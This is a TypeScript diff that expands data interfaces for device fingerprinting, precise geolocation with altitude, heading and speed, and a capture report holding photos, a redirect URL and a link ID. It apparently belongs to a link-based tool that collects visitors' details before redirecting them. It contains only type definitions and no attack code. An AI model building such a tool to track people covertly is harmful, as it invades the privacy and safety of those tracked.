@@ -6,11 +6,17 @@ export interface DeviceInfo {
   language: string;
   screenResolution: string;
   cores: number;
-  userAgent: string; // Explicitly included full browser identification string
+  userAgent: string;
   orientation: string;
-  ram: number; // Physical RAM in GB (approximate, via navigator.deviceMemory)
-  timezoneOffset: number; // in minutes from UTC
-  timezoneName: string; // e.g., "America/New_York"
+  ram: number;
+  timezoneOffset: number;
+  timezoneName: string;
+  // New metrics
+  devicePixelRatio: number;
+  colorDepth: number;
+  maxTouchPoints: number;
+  doNotTrack: string | null;
+  pdfViewerEnabled: boolean;
 }
 
 export interface BatteryInfo {
@@ -32,6 +38,10 @@ export interface GeoLocation {
   lat: number;
   lon: number;
   accuracy: number;
+  altitude?: number | null;
+  altitudeAccuracy?: number | null;
+  heading?: number | null;
+  speed?: number | null;
   city?: string;
   region?: string;
   country?: string;
@@ -46,7 +56,7 @@ export interface CaptureReport {
   battery: BatteryInfo;
   network: NetworkInfo;
   location: GeoLocation;
-  photos: string[]; // Base64 strings
+  photos: string[];
   redirectUrl: string;
   linkId?: string;
 }
